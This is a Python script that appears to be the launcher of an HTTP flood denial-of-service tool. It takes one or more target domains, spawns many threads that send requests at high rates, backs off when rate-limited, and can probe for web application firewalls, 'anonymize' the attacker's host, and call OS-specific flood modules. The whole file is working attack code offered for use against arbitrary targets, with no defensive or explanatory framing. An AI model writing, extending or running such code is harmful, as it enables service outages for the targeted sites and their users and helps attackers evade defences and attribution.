#!/usr/bin/env python3
import os
import time
import threading
import requests
import random

from auto_waf import scan_waf
from tls_fingerprint import get_random_tls_headers
from anonymizer import anonymize_host
from expansion_engine import build_payload_headers
from graph_report import init_graphing, update_graph
from target_rotator import load_targets
from windowsflood import flood_windows
from linuxflood import flood_linux
from visuals import banner, dynamic_input

stats = { "sent": 0, "success": 0, "fail": 0 }
lock = threading.Lock()

def yes(prompt):
    return dynamic_input(prompt + " (Y/n): ").strip().lower() in ["y", "yes", ""]

def fire_generic(target, duration, fire_rate, method, expansions, http2, auto_tune):
    end_time = time.time() + duration
    while time.time() < end_time:
        headers = build_payload_headers(target, expansions, http2)
        try:
            for _ in range(fire_rate):
                r = requests.request(method, target, headers=headers, timeout=2)
                with lock:
                    stats["sent"] += 1
                    if r.status_code == 200:
                        stats["success"] += 1
                    else:
                        stats["fail"] += 1
                if auto_tune and r.status_code in [403, 429]:
                    fire_rate = max(1, fire_rate - 10)
        except:
            with lock:
                stats["sent"] += 1
                stats["fail"] += 1

def run_attack():
    os.system("cls" if os.name == "nt" else "clear")
    banner()
    print()

    targets = []
    first_target = dynamic_input("🔫 Enter target domain or IP (e.g., example.com): ").strip()
    if first_target:
        targets.append(first_target if first_target.startswith("http") else f"https://{first_target}")

    while yes("➕ Add another target?"):
        next_target = dynamic_input("🔗 Enter additional target: ").strip()
        if next_target:
            targets.append(next_target if next_target.startswith("http") else f"https://{next_target}")

    duration = int(dynamic_input("⏱️ Duration in seconds (default 60): ") or "60")
    threads = int(dynamic_input("🔁 Number of threads (default 100): ") or "100")
    fire_rate = int(dynamic_input("💥 Firepower rate per thread (default 250): ") or "250")
    method = dynamic_input("📡 HTTP Method (GET/POST/HEAD/OPTIONS) [default GET]: ").strip().upper() or "GET"
    expansions = yes("🔬 Enable Payload Expansions?")
    http2 = yes("📡 Enable HTTP/2 mode?")
    auto_tune = yes("🤖 Enable Auto-Fire Tuning?")
    waf_scan = yes("🛡️ Scan for WAF before attack?")
    anonymize = yes("👻 Anonymize host before launch?")
    os_target = dynamic_input("🎯 Target OS? (windows/linux/generic) [default generic]: ").strip().lower() or "generic"

    if anonymize:
        anonymize_host()
    if waf_scan:
        for t in targets:
            scan_waf(t)

    init_graphing(duration)

    for target in targets:
        print(f"⚔️ Launching: {target} | Method: {method} | Threads: {threads} | Rate: {fire_rate}/t")
        if os_target == "windows":
            flood_windows(target, duration=duration, threads=threads)
        elif os_target == "linux":
            flood_linux(target, duration=duration, threads=threads)
        else:
            pool = []
            for _ in range(threads):
                t = threading.Thread(target=fire_generic, args=(target, duration, fire_rate, method, expansions, http2, auto_tune))
                t.start()
                pool.append(t)
            for t in pool:
                t.join()

        update_graph(stats)

if __name__ == "__main__":
    run_attack()
